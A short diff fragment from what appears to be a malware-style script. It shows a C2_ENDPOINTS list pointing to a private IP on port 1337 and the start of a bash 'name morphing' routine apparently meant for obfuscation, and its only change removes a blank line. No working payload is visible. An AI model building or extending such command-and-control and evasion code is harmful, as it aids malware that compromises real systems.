@@ -20,7 +20,6 @@ C2_ENDPOINTS = [
     ("192.168.1.1", 1337)
 ]
 
-
 # --- Enhanced Variable/Function Name Morphing ---
 def random_unicode_letter():
     # Only use bash-valid characters
